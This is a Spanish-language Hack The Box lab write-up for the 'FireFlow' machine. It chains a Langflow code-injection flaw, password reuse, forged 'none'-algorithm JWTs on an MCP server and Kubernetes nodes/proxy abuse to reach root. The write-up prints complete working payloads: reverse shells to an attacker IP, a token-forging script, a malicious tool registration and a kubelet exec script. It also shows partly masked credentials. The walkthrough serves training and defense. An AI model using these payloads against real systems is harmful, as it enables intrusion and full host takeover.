# FireFlow — Hack The Box Write-up

**Dificultad**: Medium (estimado)
**Sistema operativo**: Linux
**IP**: 10.129.45.111
**Fecha de resolución**: 02 julio 2026
**CVEs**: CVE-2026-33017 (Langflow RCE), JWT None Algorithm, Kubernetes nodes/proxy abuse

---

## Resumen Ejecutivo

FireFlow es una máquina que encadena múltiples vulnerabilidades en distintas capas: explotación de un motor de flujos de IA (Langflow 1.8.2) vía RCE, reutilización de credenciales para acceso SSH, forja de tokens JWT con algoritmo `none` en un servidor MCP, y escalada de privilegios abusando del permiso `nodes/proxy` de Kubernetes para ejecutar comandos en un pod privilegiado con el filesystem del host montado.

---

## Cadena de Ataque

```
CVE-2026-33017 (Langflow RCE)
    → Shell como www-data
    → Credenciales en variables de entorno
    → SSH como nightfall (password reuse)
    → MCP config.json → credenciales langflow-bot
    → JWT none algorithm → token admin forjado
    → Tool maliciosa registrada en MCP server
    → Shell en pod mcp-server
    → nodes/proxy permission → kubelet exec
    → Pod privilegiado (node-exporter) con hostPath /
    → cat /host/root/root.txt
```

---

## Reconocimiento

### Nmap

```bash
nmap -sCV -p- --min-rate 5000 -oN nmap.txt 10.129.45.111
```

Puertos relevantes:
- **22** — OpenSSH
- **443** — nginx + Langflow 1.8.2
- **9100** — filtrado (node-exporter, accesible luego desde el cluster)

### Subdominios

```
fireflow.htb        → página informativa (Task Force Nightfall)
flow.fireflow.htb   → instancia Langflow con playground público
```

### Identificación de la aplicación

```bash
curl -sk -A "Mozilla/5.0" https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

La respuesta HTML revela **Langflow v1.8.2** y un flow público de 3 nodos:

```
ChatInput-608En → TextOperations-yvwhG → ChatOutput-gfxpD
```

---

## Explotación — CVE-2026-33017 (Langflow RCE)

**Tipo**: Arbitrary Code Execution mediante inyección de nodos Python custom en el endpoint público de build.

### Endpoints clave

```
POST /api/v1/build_public_tmp/{flow_id}/flow
GET  /api/v1/build_public_tmp/{job_id}/events
```

No requieren autenticación siempre que se envíe una cookie `client_id`.

### Preparar listener

```bash
nc -nvlp 9001
```

### Payload — Reverse Shell

```bash
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.16.21/9001 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code"
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"UNDEFINED","cache":true}],
            "field_order": ["code"]
          }
        }
      }],
      "edges": []
    }
  }'
```

✅ **Shell obtenida como `www-data`**

---

## Post-Explotación — www-data

### Credenciales en variables de entorno

```bash
env | grep -i langflow
```

```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3********
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

Langflow almacena su contraseña de superusuario en texto plano en el entorno del proceso.

### Archivos relevantes

```bash
ls /var/lib/langflow/
# ba4fe756-d6f7-4c7a-a7b1-f986206878ec/
# langflow.db  (0 bytes — vacío, la DB real está en memoria/Postgres)
# profile_pictures/
# secret_key
```

---

## Acceso SSH — nightfall

Reutilización de contraseña: el usuario del sistema comparte credenciales con el superusuario de Langflow.

```bash
ssh nightfall@10.129.45.111
# Password: n1ghtm4r3*************
```

✅ **User flag obtenida** en `/home/nightfall/user.txt`

---

## Pivoting al MCP Server

### MCP config expuesto en home directory

```bash
cat ~/.mcp/config.json
```

```json
{
  "server": "http://10.129.45.111:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

### Autenticación y obtención de JWT

```bash
curl -s -X POST http://10.129.45.111:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```

Se obtiene un `access_token` (JWT válido con rol limitado).

---

## Escalada de Privilegios — JWT None Algorithm

El servidor MCP no valida la firma del JWT. Se puede forjar un token de admin con el algoritmo `none`.

### Script de forja

```bash
cat > /tmp/craft.py << 'EOF'
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
token   = f"{header}.{payload}."

print(token)
EOF

python3 /tmp/craft.py
```

### Registro de tool maliciosa con el token admin

```bash
ADMIN_JWT="<token_forjado>"

curl -s -X POST http://10.129.45.111:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "shell",
    "description": "debug shell",
    "inputSchema": {"type":"object","properties":{}},
    "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n  import sys;sys.exit(0)\nos.setsid()\ns=socket.socket()\ns.connect((\"10.10.16.21\",9001))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn(\"/bin/bash\")"
  }'
```

### Trigger de la tool

```bash
curl -s -X POST http://10.129.45.111:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

✅ **Shell obtenida dentro del pod `mcp-server`**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Escalada a Root — Kubernetes nodes/proxy

### Confirmar ServiceAccount token

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null
```

El payload del JWT revela:
- **Namespace**: `default`
- **Pod**: `mcp-server-54464cb475-29ztf`
- **ServiceAccount**: `mcp-sa`
- **Nodo**: `fireflow`

### Enumerar permisos del ServiceAccount

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -sk -X POST "https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
  | python3 -c "
import sys,json
rules = json.load(sys.stdin)['status'].get('resourceRules',[])
for r in rules: print(r)
"
```

**Permiso crítico encontrado**: `nodes/proxy` — permite comunicarse directamente con el kubelet (puerto 10250) sin restricciones de RBAC adicionales.

### Identificar pod privilegiado con hostPath

```bash
curl -sk "https://10.129.45.111:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ns   = item['metadata']['namespace']
    name = item['metadata']['name']
    vols = [v for v in item['spec'].get('volumes', []) if 'hostPath' in v]
    for c in item['spec']['containers']:
        csc = c.get('securityContext', {})
        if csc.get('privileged') and vols:
            paths = [v['hostPath']['path'] for v in vols]
            print(f'[!] PRIVILEGED: {ns}/{name} - container: {c[\"name\"]} - hostPaths: {paths}')
"
```

Resultado: pod `prometheus/prometheus-node-exporter-nmntq`, contenedor `node-exporter`, con `/` del host montado en `/host`.

### Ejecución remota vía kubelet WebSocket

```bash
cat > /tmp/kube_exec.py << 'EOF'
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE    = "10.129.45.111"
NE_NS   = "monitoring"
NE_POD  = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT  = "node-exporter"
TOKEN   = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
            f"?output=1&error=1&{args}")

    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
EOF

python3 /tmp/kube_exec.py "id"
# uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

### Leer flag de root

```bash
python3 /tmp/kube_exec.py "id"
# uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)

python3 /tmp/kube_exec.py "cat /host/root/root/root.txt"
# e1625b6d36f*******************
```

> **Nota**: La ruta es `/host/root/root/root.txt` porque el hostPath `/` del host está montado en `/host` dentro del contenedor, y la flag vive en `/root/root.txt` del sistema real.

✅ **Root flag obtenida**: `e1625b6d36****************`

---

## Lecciones Aprendidas

### CVE-2026-33017 — Langflow Public Build Endpoint
El endpoint `/api/v1/build_public_tmp/` permite inyectar nodos Python arbitrarios en flows públicos sin autenticación. La versión 1.8.2 no sanitiza el campo `code` de nodos custom, ejecutando el código directamente en el contexto del servidor.

### Credenciales en variables de entorno
Langflow expone `LANGFLOW_SUPERUSER_PASSWORD` en texto plano en el entorno del proceso (`/proc/<pid>/environ`). Un atacante con lectura del proceso puede extraerlas sin tocar disco.

### JWT None Algorithm
Algoritmo de firma `none` en JWT permite omitir completamente la verificación de firma. Cualquier biblioteca que acepte este algoritmo es vulnerable. El MCP server no tenía configurada la lista blanca de algoritmos permitidos.

### nodes/proxy en Kubernetes
El permiso `nodes/proxy` en un ServiceAccount es equivalente a acceso root al nodo: permite comunicarse directamente con el kubelet en el puerto 10250, ejecutando comandos en cualquier contenedor del nodo, incluyendo pods privilegiados con el filesystem del host montado.

---

## Referencias

- [CVE-2026-33017 — Langflow RCE](https://nvd.nist.gov/vuln/detail/CVE-2026-33017)
- [JWT Algorithm Confusion / None Attack](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [Kubernetes nodes/proxy privilege escalation](https://www.paloaltonetworks.com/blog/prisma-cloud/kubernetes-rbac-privilege-escalation/)
- [HTB Profile — yisus666-bit](https://github.com/yisus666-bit)

---

*Write-up by Andres Rojas · github.com/yisus666-bit*
